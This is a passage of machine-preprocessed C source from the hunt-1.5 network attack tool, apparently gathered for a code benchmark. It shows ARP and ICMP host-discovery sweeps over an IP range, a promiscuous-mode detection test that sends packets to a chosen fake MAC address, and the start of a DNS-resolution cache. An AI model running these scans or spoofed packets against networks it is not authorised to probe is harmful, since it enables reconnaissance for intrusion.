      goto case_115;
    }
#line 266
    if (tmp == 107) {
#line 266
      goto case_107;
    }
#line 269
    if (tmp == 108) {
#line 269
      goto case_108;
    }
#line 272
    if (tmp == 104) {
#line 272
      goto case_104;
    }
#line 275
    if (tmp == 116) {
#line 275
      goto case_116;
    }
#line 278
    if (tmp == 97) {
#line 278
      goto case_97;
    }
#line 281
    if (tmp == 109) {
#line 281
      goto case_109;
    }
#line 284
    if (tmp == 100) {
#line 284
      goto case_100;
    }
#line 287
    if (tmp == 120) {
#line 287
      goto case_120;
    }
#line 262
    goto switch_break;
    case_115: /* CIL Label */ 
    {
#line 264
    start_mac_discovery();
    }
#line 265
    goto switch_break;
    case_107: /* CIL Label */ 
    {
#line 267
    stop_mac_discovery();
    }
#line 268
    goto switch_break;
    case_108: /* CIL Label */ 
    {
#line 270
    mdi_list();
    }
#line 271
    goto switch_break;
    case_104: /* CIL Label */ 
    {
#line 273
    print_mac_table();
    }
#line 274
    goto switch_break;
    case_116: /* CIL Label */ 
    {
#line 276
    mdi_time_wait();
    }
#line 277
    goto switch_break;
    case_97: /* CIL Label */ 
    {
#line 279
    mdi_add();
    }
#line 280
    goto switch_break;
    case_109: /* CIL Label */ 
    {
#line 282
    mdi_mod();
    }
#line 283
    goto switch_break;
    case_100: /* CIL Label */ 
    {
#line 285
    mdi_del();
    }
#line 286
    goto switch_break;
    case_120: /* CIL Label */ 
#line 288
    run_it = 0;
#line 289
    goto switch_break;
    switch_break: /* CIL Label */ ;
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 292
  return;
}
}
#line 21 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hostup.c"
static struct list l_icmp_packet  = 
#line 21 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hostup.c"
     {(void *)0, (void *)0, (int )((char *)(& ((struct packet *)0)->p_next[5]) - (char *)0),
    0, (struct list_iterator *)((void *)0), 0, {{0, 0U, 0, 0U, 0, (short)0, (short)0,
                                                 {(struct __pthread_internal_list *)0,
                                                  (struct __pthread_internal_list *)0}}},
    {{0, 0U, 0ULL, 0ULL, 0ULL, (void *)0, 0U, 0U}}, (pthread_t )0};
#line 22 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hostup.c"
static struct list l_arp_packet  = 
#line 22
     {(void *)0, (void *)0, (int )((char *)(& ((struct packet *)0)->p_next[5]) - (char *)0),
    0, (struct list_iterator *)((void *)0), 0, {{0, 0U, 0, 0U, 0, (short)0, (short)0,
                                                 {(struct __pthread_internal_list *)0,
                                                  (struct __pthread_internal_list *)0}}},
    {{0, 0U, 0ULL, 0ULL, 0ULL, (void *)0, 0U, 0U}}, (pthread_t )0};
#line 35 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hostup.c"
static void func_icmp_packet(struct packet *p , void *arg ) 
{ 
  struct iphdr *iph ;
  struct icmphdr *icmph ;
  struct host_up_info *hui ;
  uint32_t tmp ;
  uint32_t tmp___0 ;
  uint32_t tmp___1 ;
  uint32_t tmp___2 ;

  {
  {
#line 37
  iph = p->p_iph;
#line 38
  icmph = p->p_hdr.p_icmph;
#line 39
  hui = (struct host_up_info *)arg;
#line 41
  tmp = ntohl(iph->saddr);
#line 41
  tmp___0 = ntohl(hui->start_addr);
  }
#line 41
  if (tmp >= tmp___0) {
    {
#line 41
    tmp___1 = ntohl(iph->saddr);
#line 41
    tmp___2 = ntohl(hui->end_addr);
    }
#line 41
    if (tmp___1 <= tmp___2) {
#line 41
      if ((int )icmph->type == 0) {
#line 41
        if ((int )icmph->code == 0) {
          {
#line 44
          packet_want(p);
#line 45
          list_produce(& l_icmp_packet, (void *)p);
          }
        }
      }
    }
  }
#line 47
  return;
}
}
#line 49 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hostup.c"
static void func_arp_packet(struct packet *p , void *arg ) 
{ 
  struct host_up_info *hui ;
  struct arpeth_hdr *arpethh ;
  unsigned int ip ;
  uint16_t tmp ;
  uint32_t tmp___0 ;
  uint32_t tmp___1 ;
  uint32_t tmp___2 ;
  uint32_t tmp___3 ;

  {
  {
#line 51
  hui = (struct host_up_info *)arg;
#line 55
  arpethh = (struct arpeth_hdr *)(p->p_arph + 1);
#line 56
  ip = *((unsigned int *)(arpethh->ar_sip));
#line 58
  tmp = htons((uint16_t )2);
  }
#line 58
  if ((int )(p->p_arph)->ar_op == (int )tmp) {
    {
#line 58
    tmp___0 = ntohl(ip);
#line 58
    tmp___1 = ntohl(hui->start_addr);
    }
#line 58
    if (tmp___0 >= tmp___1) {
      {
#line 58
      tmp___2 = ntohl(ip);
#line 58
      tmp___3 = ntohl(hui->end_addr);
      }
#line 58
      if (tmp___2 <= tmp___3) {
        {
#line 61
        packet_want(p);
#line 62
        list_produce(& l_arp_packet, (void *)p);
        }
      }
    }
  }
#line 64
  return;
}
}
#line 66 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hostup.c"
static void perform_ping(struct host_up_info *hui , int count___0 , int *up , unsigned char *fake_mac ) 
{ 
  struct mac_info *m ;
  struct packet *p ;
  struct timeval tv ;
  struct timespec timeout ;
  unsigned int ip ;
  unsigned int src_addr ;
  unsigned int idx ;
  int j ;
  uint32_t tmp ;
  uint32_t tmp___0 ;
  uint32_t tmp___1 ;
  uint16_t tmp___2 ;
  uint16_t tmp___3 ;
  uint32_t tmp___4 ;
  uint32_t tmp___5 ;
  uint32_t tmp___6 ;
  uint32_t tmp___7 ;
  int tmp___8 ;
  int tmp___9 ;
  void *tmp___10 ;

  {
  {
#line 76
  printf((char const   */* __restrict  */)"ping");
#line 77
  fflush(stdout);
#line 78
  j = 1;
  }
  {
#line 78
  while (1) {
    while_continue: /* CIL Label */ ;
#line 78
    if (! (j <= count___0)) {
#line 78
      goto while_break;
    }
#line 79
    ip = hui->start_addr;
    {
#line 79
    while (1) {
      while_continue___0: /* CIL Label */ ;
      {
#line 79
      tmp___4 = ntohl(ip);
#line 79
      tmp___5 = ntohl(hui->end_addr);
      }
#line 79
      if (! (tmp___4 <= tmp___5)) {
#line 79
        goto while_break___0;
      }
      {
#line 82
      tmp___0 = ntohl(ip);
#line 82
      tmp___1 = ntohl(hui->start_addr);
#line 82
      idx = tmp___0 - tmp___1;
      }
#line 83
      if (! *(up + idx)) {
#line 84
        if (! fake_mac) {
          {
#line 85
          m = mac_info_get(ip);
          }
#line 85
          if (m) {
            {
#line 86
            tmp___2 = htons((uint16_t )(j + 2000));
#line 86
            send_icmp_request(my_eth_ip, ip, (char *)(my_eth_mac), m->mac, tmp___2);
#line 89
            mac_info_release(m);
            }
          }
        } else {
          {
#line 92
          tmp___3 = htons((uint16_t )(j + 2000));
#line 92
          send_icmp_request(my_eth_ip, ip, (char *)(my_eth_mac), (char *)fake_mac,
                            tmp___3);
          }
        }
      }
      {
#line 79
      tmp = ntohl(ip);
#line 79
      ip = htonl(tmp + 1U);
      }
    }
    while_break___0: /* CIL Label */ ;
    }
    {
#line 98
    gettimeofday((struct timeval */* __restrict  */)(& tv), (__timezone_ptr_t )((void *)0));
#line 99
    timeout.tv_sec = tv.tv_sec + 2L;
#line 100
    timeout.tv_nsec = tv.tv_usec * 1000L;
    }
    {
#line 101
    while (1) {
      while_continue___1: /* CIL Label */ ;
      {
#line 101
      tmp___10 = list_consume(& l_icmp_packet, (struct timespec  const  *)(& timeout));
#line 101
      p = (struct packet *)tmp___10;
      }
#line 101
      if (! p) {
#line 101
        goto while_break___1;
      }
      {
#line 104
      src_addr = (p->p_iph)->saddr;
#line 105
      tmp___8 = is_icmp_reply(p, src_addr, my_eth_ip, (char *)((p->p_ethh)->h_source),
                              (char *)(my_eth_mac));
      }
#line 105
      if (tmp___8) {
        {
#line 109
        tmp___6 = ntohl(src_addr);
#line 109
        tmp___7 = ntohl(hui->start_addr);
#line 109
        idx = tmp___6 - tmp___7;
#line 110
        *(up + idx) = 1;
#line 111
        host_lookup(src_addr, 1);
        }
      } else
#line 105
      if (fake_mac) {
        {
#line 105
        tmp___9 = is_icmp_reply(p, src_addr, my_eth_ip, (char *)fake_mac, (char *)(my_eth_mac));
        }
#line 105
        if (tmp___9) {
          {
#line 109
          tmp___6 = ntohl(src_addr);
#line 109
          tmp___7 = ntohl(hui->start_addr);
#line 109
          idx = tmp___6 - tmp___7;
#line 110
          *(up + idx) = 1;
#line 111
          host_lookup(src_addr, 1);
          }
        }
      }
      {
#line 113
      packet_free(p);
      }
    }
    while_break___1: /* CIL Label */ ;
    }
    {
#line 115
    printf((char const   */* __restrict  */)".");
#line 116
    fflush(stdout);
#line 78
    j ++;
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 118
  printf((char const   */* __restrict  */)"\n");
  }
#line 119
  return;
}
}
#line 121 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hostup.c"
static void send_arp_message(unsigned int ip , char *dst_mac ) 
{ 
  struct arp_spec as ;
  uint16_t tmp ;

  {
  {
#line 125
  as.src_mac = (char *)(my_eth_mac);
#line 126
  as.dst_mac = dst_mac;
#line 127
  tmp = htons((uint16_t )1);
#line 127
  as.oper = (int )tmp;
#line 128
  as.sender_mac = (char *)(my_eth_mac);
#line 129
  as.sender_addr = (unsigned long )my_eth_ip;
#line 130
  as.target_mac = (char *)(mac_zero);
#line 131
  as.target_addr = (unsigned long )ip;
#line 133
  send_arp_packet(& as);
  }
#line 134
  return;
}
}
#line 139 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hostup.c"
static void perform_arp(struct host_up_info *hui , int count___0 , int *up , unsigned char *fake_mac ) 
{ 
  t_longchar tmp ;
  int i ;
  int j ;
  int idx ;
  unsigned int ip ;
  unsigned int src_addr ;
  struct arpeth_hdr *arpethh ;
  struct timeval tv ;
  struct timespec timeout ;
  struct packet *p ;
  uint32_t tmp___0 ;
  uint32_t tmp___1 ;
  uint32_t tmp___2 ;
  uint32_t tmp___3 ;
  uint32_t tmp___4 ;
  uint32_t tmp___5 ;
  uint32_t tmp___6 ;
  int tmp___7 ;
  int tmp___8 ;
  int tmp___9 ;
  void *tmp___10 ;

  {
  {
#line 150
  printf((char const   */* __restrict  */)"arp");
#line 151
  fflush(stdout);
#line 152
  j = 1;
  }
  {
#line 152
  while (1) {
    while_continue: /* CIL Label */ ;
#line 152
    if (! (j <= count___0)) {
#line 152
      goto while_break;
    }
#line 153
    ip = hui->start_addr;
    {
#line 153
    while (1) {
      while_continue___0: /* CIL Label */ ;
      {
#line 153
      tmp___3 = ntohl(ip);
#line 153
      tmp___4 = ntohl(hui->end_addr);
      }
#line 153
      if (! (tmp___3 <= tmp___4)) {
#line 153
        goto while_break___0;
      }
      {
#line 156
      tmp___1 = ntohl(ip);
#line 156
      tmp___2 = ntohl(hui->start_addr);
#line 156
      idx = (int )(tmp___1 - tmp___2);
      }
#line 157
      if (! *(up + idx)) {
#line 158
        if (! fake_mac) {
          {
#line 159
          send_arp_message(ip, (char *)(mac_broadcast));
          }
        } else {
          {
#line 161
          send_arp_message(ip, (char *)fake_mac);
          }
        }
      }
      {
#line 153
      tmp___0 = ntohl(ip);
#line 153
      ip = htonl(tmp___0 + 1U);
      }
    }
    while_break___0: /* CIL Label */ ;
    }
    {
#line 165
    gettimeofday((struct timeval */* __restrict  */)(& tv), (__timezone_ptr_t )((void *)0));
#line 166
    timeout.tv_sec = tv.tv_sec + 2L;
#line 167
    timeout.tv_nsec = tv.tv_usec * 1000L;
    }
    {
#line 171
    while (1) {
      while_continue___1: /* CIL Label */ ;
      {
#line 171
      tmp___10 = list_consume(& l_arp_packet, (struct timespec  const  *)(& timeout));
#line 171
      p = (struct packet *)tmp___10;
      }
#line 171
      if (! p) {
#line 171
        goto while_break___1;
      }
      {
#line 172
      arpethh = (struct arpeth_hdr *)(p->p_arph + 1);
#line 173
      src_addr = *((unsigned int *)(arpethh->ar_sip));
#line 174
      tmp___7 = memcmp((void const   *)(arpethh->ar_sha), (void const   *)((p->p_ethh)->h_source),
                       (size_t )6);
      }
#line 174
      if (tmp___7 == 0) {
        {
#line 174
        tmp___8 = memcmp((void const   *)(my_eth_mac), (void const   *)((p->p_ethh)->h_dest),
                         (size_t )6);
        }
#line 174
        if (tmp___8 == 0) {
          {
#line 174
          tmp___9 = memcmp((void const   *)(my_eth_mac), (void const   *)(arpethh->ar_tha),
                           (size_t )6);
          }
#line 174
          if (tmp___9 == 0) {
#line 178
            i = 0;
            {
#line 178
            while (1) {
              while_continue___2: /* CIL Label */ ;
#line 178
              if (! (i < 4)) {
#line 178
                goto while_break___2;
              }
#line 179
              tmp.buff[i] = (char )arpethh->ar_tip[i];
#line 178
              i ++;
            }
            while_break___2: /* CIL Label */ ;
            }
#line 180
            if (tmp.val == (unsigned long )my_eth_ip) {
              {
#line 182
              tmp___5 = ntohl(src_addr);
#line 182
              tmp___6 = ntohl(hui->start_addr);
#line 182
              idx = (int )(tmp___5 - tmp___6);
#line 183
              *(up + idx) = 1;
#line 184
              host_lookup(src_addr, 1);
              }
            }
          }
        }
      }
      {
#line 187
      packet_free(p);
      }
    }
    while_break___1: /* CIL Label */ ;
    }
    {
#line 189
    printf((char const   */* __restrict  */)".");
#line 190
    fflush(stdout);
#line 152
    j ++;
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 192
  printf((char const   */* __restrict  */)"\n");
  }
#line 193
  return;
}
}
#line 195 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hostup.c"
static void list_host_up(struct host_up_info *hui , int *up ) 
{ 
  unsigned int addr ;
  unsigned int idx ;
  uint32_t tmp ;
  uint32_t tmp___0 ;
  uint32_t tmp___1 ;
  char *tmp___2 ;
  uint32_t tmp___3 ;
  uint32_t tmp___4 ;

  {
#line 199
  addr = hui->start_addr;
  {
#line 199
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 199
    tmp___3 = ntohl(addr);
#line 199
    tmp___4 = ntohl(hui->end_addr);
    }
#line 199
    if (! (tmp___3 <= tmp___4)) {
#line 199
      goto while_break;
    }
    {
#line 202
    tmp___0 = ntohl(addr);
#line 202
    tmp___1 = ntohl(hui->start_addr);
#line 202
    idx = tmp___0 - tmp___1;
    }
#line 203
    if (up) {
#line 203
      if (*(up + idx)) {
        {
#line 205
        tmp___2 = host_lookup(addr, 1);
#line 205
        printf((char const   */* __restrict  */)"UP  %s\n", tmp___2);
        }
      } else {
#line 203
        goto _L;
      }
    } else
    _L: /* CIL Label */ 
#line 203
    if (! up) {
#line 203
      if (*(hui->up_ping + idx)) {
        {
#line 205
        tmp___2 = host_lookup(addr, 1);
#line 205
        printf((char const   */* __restrict  */)"UP  %s\n", tmp___2);
        }
      } else
#line 203
      if (*(hui->up_arp + idx)) {
        {
#line 205
        tmp___2 = host_lookup(addr, 1);
#line 205
        printf((char const   */* __restrict  */)"UP  %s\n", tmp___2);
        }
      }
    }
    {
#line 199
    tmp = ntohl(addr);
#line 199
    addr = htonl(tmp + 1U);
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 208
  return;
}
}
#line 210 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hostup.c"
static void list_host_promisc(struct host_up_info *hui , int *promisc ) 
{ 
  unsigned int addr ;
  unsigned int idx ;
  uint32_t tmp ;
  uint32_t tmp___0 ;
  uint32_t tmp___1 ;
  char *tmp___2 ;
  uint32_t tmp___3 ;
  uint32_t tmp___4 ;

  {
#line 214
  addr = hui->start_addr;
  {
#line 214
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 214
    tmp___3 = ntohl(addr);
#line 214
    tmp___4 = ntohl(hui->end_addr);
    }
#line 214
    if (! (tmp___3 <= tmp___4)) {
#line 214
      goto while_break;
    }
    {
#line 217
    tmp___0 = ntohl(addr);
#line 217
    tmp___1 = ntohl(hui->start_addr);
#line 217
    idx = tmp___0 - tmp___1;
    }
#line 218
    if (promisc) {
#line 218
      if (*(promisc + idx)) {
        {
#line 220
        tmp___2 = host_lookup(addr, 1);
#line 220
        printf((char const   */* __restrict  */)"in PROMISC MODE  %s\n", tmp___2);
        }
      } else {
#line 218
        goto _L;
      }
    } else
    _L: /* CIL Label */ 
#line 218
    if (! promisc) {
#line 218
      if (*(hui->promisc_ping + idx)) {
        {
#line 220
        tmp___2 = host_lookup(addr, 1);
#line 220
        printf((char const   */* __restrict  */)"in PROMISC MODE  %s\n", tmp___2);
        }
      } else
#line 218
      if (*(hui->promisc_arp + idx)) {
        {
#line 220
        tmp___2 = host_lookup(addr, 1);
#line 220
        printf((char const   */* __restrict  */)"in PROMISC MODE  %s\n", tmp___2);
        }
      }
    }
    {
#line 214
    tmp = ntohl(addr);
#line 214
    addr = htonl(tmp + 1U);
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 224
  return;
}
}
#line 228 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hostup.c"
static unsigned int start_ip_def  =    0U;
#line 228 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hostup.c"
static unsigned int end_ip_def  =    0U;
#line 226 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hostup.c"
void host_up(void) 
{ 
  unsigned int start_ip ;
  unsigned int end_ip ;
  struct ifunc_item ifunc_icmp ;
  struct ifunc_item ifunc_arp___0 ;
  struct host_up_info *hui ;
  struct timespec ts ;
  unsigned int len ;
  unsigned char buf_mac[512] ;
  unsigned char fake_mac[6] ;
  char *tmp ;
  char *tmp___0 ;
  uint32_t tmp___1 ;
  uint32_t tmp___2 ;
  void *tmp___3 ;
  void *tmp___4 ;
  void *tmp___5 ;
  void *tmp___6 ;
  void *tmp___7 ;
  int tmp___8 ;
  int tmp___9 ;
  int tmp___10 ;
  unsigned char *tmp___11 ;
  int tmp___12 ;
  int tmp___13 ;
  unsigned char *tmp___14 ;
  int tmp___15 ;

  {
  {
#line 237
  tmp = host_lookup(start_ip_def, 0);
#line 237
  start_ip = menu_choose_hostname((char *)"start ip addr", tmp);
  }
#line 237
  if (start_ip == 4294967295U) {
#line 238
    return;
  }
  {
#line 239
  tmp___0 = host_lookup(end_ip_def, 0);
#line 239
  end_ip = menu_choose_hostname((char *)"end ip addr", tmp___0);
  }
#line 239
  if (end_ip == 4294967295U) {
#line 240
    return;
  }
  {
#line 241
  tmp___1 = ntohl(end_ip);
#line 241
  tmp___2 = ntohl(start_ip);
#line 241
  len = (tmp___1 - tmp___2) + 1U;
  }
#line 241
  if (len < 0U) {
    {
#line 242
    printf((char const   */* __restrict  */)"bad addresses\n");
    }
#line 243
    return;
  }
  {
#line 245
  start_ip_def = start_ip;
#line 246
  end_ip_def = end_ip;
#line 248
  tmp___3 = malloc(sizeof(struct host_up_info ));
#line 248
  hui = (struct host_up_info *)tmp___3;
#line 249
  hui->start_addr = start_ip;
#line 250
  hui->end_addr = end_ip;
#line 251
  tmp___4 = malloc(sizeof(int ) * (unsigned long )len);
#line 251
  hui->up_ping = (int *)tmp___4;
#line 252
  tmp___5 = malloc(sizeof(int ) * (unsigned long )len);
#line 252
  hui->promisc_ping = (int *)tmp___5;
#line 253
  tmp___6 = malloc(sizeof(int ) * (unsigned long )len);
#line 253
  hui->up_arp = (int *)tmp___6;
#line 254
  tmp___7 = malloc(sizeof(int ) * (unsigned long )len);
#line 254
  hui->promisc_arp = (int *)tmp___7;
#line 255
  hui->up_len = len;
  }
#line 256
  if (! hui->up_ping) {
    {
#line 259
    printf((char const   */* __restrict  */)"bad rang\n");
    }
#line 260
    return;
  } else
#line 256
  if (! hui->promisc_ping) {
    {
#line 259
    printf((char const   */* __restrict  */)"bad rang\n");
    }
#line 260
    return;
  } else
#line 256
  if (! hui->up_arp) {
    {
#line 259
    printf((char const   */* __restrict  */)"bad rang\n");
    }
#line 260
    return;
  } else
#line 256
  if (! hui->promisc_arp) {
    {
#line 259
    printf((char const   */* __restrict  */)"bad rang\n");
    }
#line 260
    return;
  }
  {
#line 262
  memset((void *)hui->up_ping, 0, sizeof(int ) * (unsigned long )len);
#line 263
  memset((void *)hui->promisc_ping, 0, sizeof(int ) * (unsigned long )len);
#line 264
  memset((void *)hui->up_arp, 0, sizeof(int ) * (unsigned long )len);
#line 265
  memset((void *)hui->promisc_arp, 0, sizeof(int ) * (unsigned long )len);
#line 267
  tmp___8 = menu_choose_char((char *)"host up test (arp method) y/n", (char *)"yn",
                             (char )'y');
  }
  {
#line 268
  if (tmp___8 == 121) {
#line 268
    goto case_121;
  }
#line 267
  goto switch_break;
  case_121: /* CIL Label */ 
  {
#line 269
  ifunc_arp___0.func = & func_arp_packet;
#line 270
  ifunc_arp___0.arg = (void *)hui;
#line 271
  list_enqueue(& l_ifunc_arp, (void *)(& ifunc_arp___0));
#line 272
  perform_arp(hui, 3, hui->up_arp, (unsigned char *)((void *)0));
#line 273
  list_remove(& l_ifunc_arp, (void *)(& ifunc_arp___0));
#line 274
  packet_flush(& l_arp_packet);
#line 276
  list_host_up(hui, hui->up_arp);
  }
#line 277
  goto switch_break;
  switch_break: /* CIL Label */ ;
  }
  {
#line 279
  tmp___9 = menu_choose_char((char *)"host up test (ping method) y/n", (char *)"yn",
                             (char )'y');
  }
  {
#line 280
  if (tmp___9 == 121) {
#line 280
    goto case_121___0;
  }
#line 279
  goto switch_break___0;
  case_121___0: /* CIL Label */ 
  {
#line 281
  printf((char const   */* __restrict  */)"mac discovery\n");
#line 282
  mac_discover_range(hui->start_addr, hui->end_addr, 2);
#line 283
  ts.tv_sec = (__time_t )1;
#line 284
  ts.tv_nsec = (__syscall_slong_t )0;
#line 285
  nanosleep((struct timespec  const  *)(& ts), (struct timespec *)((void *)0));
#line 287
  ifunc_icmp.func = & func_icmp_packet;
#line 288
  ifunc_icmp.arg = (void *)hui;
#line 289
  list_enqueue(& l_ifunc_icmp, (void *)(& ifunc_icmp));
#line 290
  perform_ping(hui, 3, hui->up_ping, (unsigned char *)((void *)0));
#line 291
  list_remove(& l_ifunc_icmp, (void *)(& ifunc_icmp));
#line 292
  packet_flush(& l_icmp_packet);
#line 294
  list_host_up(hui, hui->up_ping);
  }
#line 295
  goto switch_break___0;
  switch_break___0: /* CIL Label */ ;
  }
  {
#line 297
  tmp___10 = menu_choose_char((char *)"net ifc promisc test (arp method) y/n", (char *)"yn",
                              (char )'y');
  }
  {
#line 298
  if (tmp___10 == 121) {
#line 298
    goto case_121___1;
  }
#line 297
  goto switch_break___1;
  case_121___1: /* CIL Label */ 
  {
#line 299
  tmp___11 = suggest_mac();
#line 299
  sprintf_eth_mac((char *)(buf_mac), tmp___11);
#line 300
  tmp___12 = menu_choose_mac((char *)"choose unused MAC in your network", fake_mac,
                             (char *)(buf_mac));
  }
#line 300
  if (tmp___12 >= 0) {
    {
#line 301
    ifunc_arp___0.func = & func_arp_packet;
#line 302
    ifunc_arp___0.arg = (void *)hui;
#line 303
    list_enqueue(& l_ifunc_arp, (void *)(& ifunc_arp___0));
#line 304
    perform_arp(hui, 3, hui->promisc_arp, fake_mac);
#line 305
    list_remove(& l_ifunc_arp, (void *)(& ifunc_arp___0));
#line 306
    packet_flush(& l_arp_packet);
#line 308
    list_host_promisc(hui, hui->promisc_arp);
    }
  }
#line 310
  goto switch_break___1;
  switch_break___1: /* CIL Label */ ;
  }
  {
#line 312
  tmp___13 = menu_choose_char((char *)"net ifc promisc test (ping method) y/n", (char *)"yn",
                              (char )'y');
  }
  {
#line 313
  if (tmp___13 == 121) {
#line 313
    goto case_121___2;
  }
#line 312
  goto switch_break___2;
  case_121___2: /* CIL Label */ 
  {
#line 314
  tmp___14 = suggest_mac();
#line 314
  sprintf_eth_mac((char *)(buf_mac), tmp___14);
#line 315
  tmp___15 = menu_choose_mac((char *)"choose unused MAC in your network", fake_mac,
                             (char *)(buf_mac));
  }
#line 315
  if (tmp___15 >= 0) {
    {
#line 316
    ifunc_icmp.func = & func_icmp_packet;
#line 317
    ifunc_icmp.arg = (void *)hui;
#line 318
    list_enqueue(& l_ifunc_icmp, (void *)(& ifunc_icmp));
#line 319
    perform_ping(hui, 3, hui->promisc_ping, fake_mac);
#line 320
    list_remove(& l_ifunc_icmp, (void *)(& ifunc_icmp));
#line 321
    packet_flush(& l_icmp_packet);
#line 323
    list_host_promisc(hui, hui->promisc_ping);
    }
  }
#line 325
  goto switch_break___2;
  switch_break___2: /* CIL Label */ ;
  }
  {
#line 327
  free((void *)hui->up_ping);
#line 328
  free((void *)hui->promisc_ping);
#line 329
  free((void *)hui->up_arp);
#line 330
  free((void *)hui->promisc_arp);
#line 331
  free((void *)hui);
  }
#line 332
  return;
}
}
#line 106 "/usr/include/x86_64-linux-gnu/sys/select.h"
extern int select(int __nfds , fd_set * __restrict  __readfds , fd_set * __restrict  __writefds ,
                  fd_set * __restrict  __exceptfds , struct timeval * __restrict  __timeout ) ;
#line 119 "/usr/include/x86_64-linux-gnu/sys/socket.h"
extern  __attribute__((__nothrow__)) int ( __attribute__((__leaf__)) socketpair)(int __domain ,
                                                                                 int __type ,
                                                                                 int __protocol ,
                                                                                 int *__fds ) ;
#line 127 "/usr/include/signal.h"
extern  __attribute__((__nothrow__)) int ( __attribute__((__leaf__)) kill)(__pid_t __pid ,
                                                                           int __sig ) ;
#line 248
extern  __attribute__((__nothrow__)) int ( __attribute__((__leaf__)) sigprocmask)(int __how ,
                                                                                  sigset_t const   * __restrict  __set ,
                                                                                  sigset_t * __restrict  __oset ) ;
#line 459 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
void resolv_remove(unsigned int ip ) ;
#line 460
void resolv_put(unsigned int ip , char const   *name ) ;
#line 461
struct resolv_item *resolv_get(unsigned int ip ) ;
#line 462
void resolv_request(unsigned int ip ) ;
#line 125 "/usr/include/x86_64-linux-gnu/sys/wait.h"
extern __pid_t waitpid(__pid_t __pid , int *__stat_loc , int __options ) ;
#line 53 "/usr/include/arpa/inet.h"
extern  __attribute__((__nothrow__)) char *( __attribute__((__leaf__)) inet_ntoa)(struct in_addr __in ) ;
#line 137 "/usr/include/netdb.h"
extern struct hostent *gethostbyaddr(void const   *__addr , __socklen_t __len , int __type ) ;
#line 290
extern struct servent *getservbyname(char const   *__name , char const   *__proto ) ;
#line 297
extern struct servent *getservbyport(int __port , char const   *__proto ) ;
#line 631 "/usr/include/unistd.h"
extern  __attribute__((__nothrow__)) __pid_t ( __attribute__((__leaf__)) getppid)(void) ;
#line 756
extern  __attribute__((__nothrow__)) __pid_t fork(void) ;
#line 19 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/resolv.c"
struct hash ip_to_name_table  ;
#line 20 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/resolv.c"
int hl_mode  =    0;
#line 46 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/resolv.c"
static int fd_req  =    -1;
#line 47 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/resolv.c"
static pid_t pid_req  =    0;
#line 48 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/resolv.c"
static pid_t pid_parent  =    0;
#line 53 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/resolv.c"
void resolv_remove(unsigned int ip ) 
{ 
  struct resolv_item *r ;
  void *tmp ;

  {
  {
#line 57
  tmp = hash_remove(& ip_to_name_table, ip, (void *)0);
#line 57
  r = (struct resolv_item *)tmp;
  }
#line 57
  if (r) {
    {
#line 58
    pthread_mutex_lock(& r->mutex);
    }
#line 59
    if (r->name) {
      {
#line 60
      free((void *)r->name);
      }
    }
    {
#line 61
    free((void *)r);
    }
  }
#line 63
  return;
}
}
#line 65 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/resolv.c"
void resolv_put(unsigned int ip , char const   *name ) 
{ 
  struct resolv_item *r ;
  void *tmp ;
  time_t tmp___0 ;

  {
  {
#line 69
  hash_lock(& ip_to_name_table);
#line 70
  resolv_remove(ip);
#line 71
  tmp = malloc(sizeof(struct resolv_item ));
#line 71
  r = (struct resolv_item *)tmp;
#line 72
  r->name = strdup(name);
#line 73
  tmp___0 = time((time_t *)((void *)0));
#line 73
  r->get_timestamp = tmp___0;
#line 73
  r->put_timestamp = tmp___0;
#line 74
  pthread_mutex_init(& r->mutex, (pthread_mutexattr_t const   *)((void *)0));
#line 75
  hash_put(& ip_to_name_table, ip, (void *)r);
#line 76
  hash_unlock(& ip_to_name_table);
  }
#line 77
  return;
}
}
#line 79 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/resolv.c"
struct resolv_item *resolv_get(unsigned int ip ) 
{ 
  struct resolv_item *r ;
  void *tmp ;

  {
  {
#line 83
  hash_lock(& ip_to_name_table);
#line 84
  tmp = hash_get(& ip_to_name_table, ip, (void *)0);
#line 84
  r = (struct resolv_item *)tmp;
  }
#line 84
  if (r) {
    {
#line 85
    pthread_mutex_lock(& r->mutex);
#line 86
    r->get_timestamp = time((time_t *)((void *)0));
    }
  }
  {
#line 88
  hash_unlock(& ip_to_name_table);
  }
#line 89
  return (r);
}
}
#line 92 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/resolv.c"
void resolv_release(struct resolv_item *r ) 
{ 


  {
  {
#line 94
  pthread_mutex_unlock(& r->mutex);
  }
#line 95
  return;
}
}
#line 97 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/resolv.c"
void resolv_request(unsigned int ip ) 
{ 
  struct req req ;
  struct in_addr addr ;
  char *tmp ;

  {
  {
#line 102
  addr.s_addr = ip;
#line 103
  req.ip = ip;
#line 104
  req.next = (struct req *)((void *)0);
#line 105
  write(fd_req, (void const   *)(& req), sizeof(struct req ));
#line 106
  tmp = inet_ntoa(addr);
#line 106
  resolv_put(ip, (char const   *)tmp);
  }
#line 107
  return;
}
}
#line 109 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/resolv.c"
static void check_interval(int __time ) 
{ 
  struct hash_iterator li ;
  struct resolv_item *r ;
  unsigned int ip ;
  void *tmp ;

  {
  {
